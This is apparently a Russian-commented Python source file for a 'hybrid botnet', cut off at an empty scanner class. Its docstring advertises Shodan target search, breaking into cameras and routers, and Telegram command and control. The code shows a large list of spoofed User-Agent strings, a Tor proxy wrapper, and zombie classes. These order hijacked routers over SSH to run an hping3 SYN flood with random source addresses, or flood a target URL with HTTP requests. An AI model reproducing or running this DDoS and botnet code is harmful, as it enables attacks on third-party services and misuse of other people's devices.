#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HYBRID BOTNET – SHODAN EDITION v.FINAL
- Глобальный поиск через Shodan
- Локальное сканирование (ping sweep)
- Улучшенный взлом камер/роутеров (HTTP, RTSP, SSH, Telnet)
- Зомби-ботнет
- DDoS (HTTP flood)
- Управление через Telegram
- Веб-сервер для Railway
"""

import asyncio
import aiohttp
import aiohttp_socks
import random
import time
import json
import os
import subprocess
import paramiko
import requests
import base64
import socket
import telnetlib
from contextlib import asynccontextmanager
from fastapi import FastAPI
import uvicorn
from cryptography.fernet import Fernet

# Shodan
try:
    import shodan
    SHODAN_AVAILABLE = True
except ImportError:
    SHODAN_AVAILABLE = False
    print("[!] Shodan not installed. Install with: pip install shodan")

# ------------------------------------------------------------
#  USER-AGENTS (полный список, который вы дали)
# ------------------------------------------------------------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux i645 ) AppleWebKit/601.39 (KHTML, like Gecko) Chrome/52.0.1303.178 Safari/600",
    "Mozilla/5.0 (Windows; U; Windows NT 6.2; x64; en-US) AppleWebKit/603.16 (KHTML, like Gecko) Chrome/49.0.3596.149 Safari/602",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_12_8) AppleWebKit/537.8 (KHTML, like Gecko) Chrome/51.0.3447.202 Safari/533",
    "Mozilla/5.0 (U; Linux x86_64; en-US) AppleWebKit/535.12 (KHTML, like Gecko) Chrome/54.0.2790.274 Safari/601",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 7_5_1) AppleWebKit/534.29 (KHTML, like Gecko) Chrome/54.0.2941.340 Safari/602",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 7_4_2) AppleWebKit/602.18 (KHTML, like Gecko) Chrome/47.0.1755.159 Safari/600",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_6_4; like Mac OS X) AppleWebKit/601.29 (KHTML, like Gecko)  Chrome/47.0.1661.149 Mobile Safari/536.4",
    "Mozilla/5.0 (Linux; Android 5.1; SM-G9350T Build/LMY47X) AppleWebKit/602.21 (KHTML, like Gecko)  Chrome/50.0.1176.329 Mobile Safari/535.9",
    "Mozilla/5.0 (Linux; U; Android 6.0.1; HTC One M8 Build/MRA58K) AppleWebKit/600.36 (KHTML, like Gecko)  Chrome/53.0.3363.154 Mobile Safari/537.2",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 8_8_3) Gecko/20100101 Firefox/50.7",
    "Mozilla/5.0 (U; Linux i671 x86_64) AppleWebKit/535.27 (KHTML, like Gecko) Chrome/54.0.1417.286 Safari/537",
    "Mozilla/5.0 (iPad; CPU iPad OS 9_4_4 like Mac OS X) AppleWebKit/536.12 (KHTML, like Gecko)  Chrome/55.0.1687.155 Mobile Safari/600.8",
    "Mozilla/5.0 (Linux; Android 4.4.1; LG-V510 Build/KOT49I) AppleWebKit/535.28 (KHTML, like Gecko)  Chrome/52.0.2705.296 Mobile Safari/602.9",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/54.0.2084.216 Safari/603.3 Edge/8.91691",
    "Mozilla/5.0 (compatible; MSIE 11.0; Windows; Windows NT 6.0; WOW64; en-US Trident/7.0)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14.6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.52 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.63 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.99 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.106 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1623.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.52 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.63 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.99 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.106 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:116.0) Gecko/20100101 Firefox/116.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:117.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPod touch; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPod touch; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPod touch; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36"
]

# ------------------------------------------------------------
#  Конфигурация и пути
# ------------------------------------------------------------
DATA_DIR = os.environ.get("RAILWAY_VOLUME_MOUNT_PATH", "/app/data")
os.makedirs(DATA_DIR, exist_ok=True)

STATS_FILE = os.path.join(DATA_DIR, "stats.json")
BLOCKCHAIN_FILE = os.path.join(DATA_DIR, "blockchain.json")

def load_stats():
    if os.path.exists(STATS_FILE):
        with open(STATS_FILE) as f:
            return json.load(f)
    return {"total_requests": 0, "cracked_devices": [], "global_found": 0}

def save_stats(stats):
    with open(STATS_FILE, 'w') as f:
        json.dump(stats, f)

stats = load_stats()

# ------------------------------------------------------------
#  Вспомогательные классы
# ------------------------------------------------------------
class ProxyManager:
    def __init__(self):
        self.socks_list = [('127.0.0.1', 9050)]
    def get_session(self):
        proxy = random.choice(self.socks_list)
        connector = aiohttp_socks.ProxyConnector.from_url(f'socks5://{proxy[0]}:{proxy[1]}')
        return aiohttp.ClientSession(connector=connector)

class CryptoLayer:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)

class BlockchainLogger:
    def log_attack(self, target, method, result):
        entry = {"target": target, "method": method, "result": result, "time": time.time()}
        with open(BLOCKCHAIN_FILE, "a") as f:
            json.dump(entry, f)
            f.write("\n")

# ------------------------------------------------------------
#  Зомби-ботнет
# ------------------------------------------------------------
class ZombieAgent:
    def __init__(self, ip, dtype, ssh=None):
        self.ip = ip
        self.type = dtype
        self.ssh = ssh
    async def execute_attack(self, target_url):
        if self.type == 'router' and self.ssh:
            try:
                self.ssh.exec_command(f"hping3 -S --flood --rand-source {target_url.split('/')[2]} -p 80")
            except:
                pass
        else:
            async with aiohttp.ClientSession() as session:
                for _ in range(50):
                    try:
                        await session.get(target_url, headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=2)
                    except:
                        pass
        return True

class ZombieBotnet:
    def __init__(self):
        self.zombies = []
    async def add_zombie(self, ip, dtype, ssh=None):
        self.zombies.append(ZombieAgent(ip, dtype, ssh))
    async def launch_attack(self, target):
        await asyncio.gather(*[z.execute_attack(target) for z in self.zombies])
    def size(self):
        return len(self.zombies)

# ------------------------------------------------------------
#  Локальный сканер (упрощённый ping sweep)
# ------------------------------------------------------------
class NetworkScanner:
